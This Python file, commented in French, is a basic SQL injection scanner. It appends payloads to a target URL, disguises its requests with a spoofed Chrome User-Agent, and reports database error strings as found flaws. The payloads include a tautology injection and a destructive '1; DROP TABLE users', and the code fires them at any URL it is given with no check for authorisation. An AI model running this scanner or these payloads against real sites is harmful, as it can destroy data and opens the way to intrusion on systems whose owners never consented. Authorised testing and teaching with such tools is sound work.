import requests

PAYLOADS = ["'", "\"", "1' OR '1'='1", "1; DROP TABLE users"]

ERREURS_SQL = [
    "SQL syntax", 
    "mysql_fetch", 
    "ORA-", 
    "PostgreSQL query failed", 
    "Microsoft OLE DB Provider for SQL Server"
]

def start_scanner(url_cible):
    """
    Teste une URL pour des failles d'injection SQL basiques.
    """
    print(f"[*] Démarrage du Scanner SQL sur {url_cible}...")
    failles_trouvees = []

    if "?" not in url_cible:
        print("[-] Attention : L'URL ne contient pas de paramètres (ex: ?id=1).")

    # 1. NOTRE DÉGUISEMENT : On se fait passer pour Google Chrome
    headers_navigateur = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    for payload in PAYLOADS:
        url_test = f"{url_cible}{payload}"
        print(f"[*] Test en cours : {url_test}")

        try:
            # 2. On utilise notre déguisement (headers) et on attend plus longtemps (timeout=10)
            reponse = requests.get(url_test, headers=headers_navigateur, timeout=10)
            
            for erreur in ERREURS_SQL:
                if erreur.lower() in reponse.text.lower():
                    alerte = f"[!!!] FAILLE DÉTECTÉE avec '{payload}' ! (Type: {erreur})"
                    print(f"\033[91m{alerte}\033[0m") 
                    
                    failles_trouvees.append(url_test)
                    break 
                    
        except requests.RequestException as e:
            print(f"[!] Erreur de connexion avec le payload {payload}")
            # 3. On affiche la vraie raison du crash pour pouvoir enquêter
            print(f"    -> Détails techniques : {e}")

    if not failles_trouvees:
        print("[+] Le site semble sécurisé contre les injections SQL basiques.")
        
    return failles_trouvees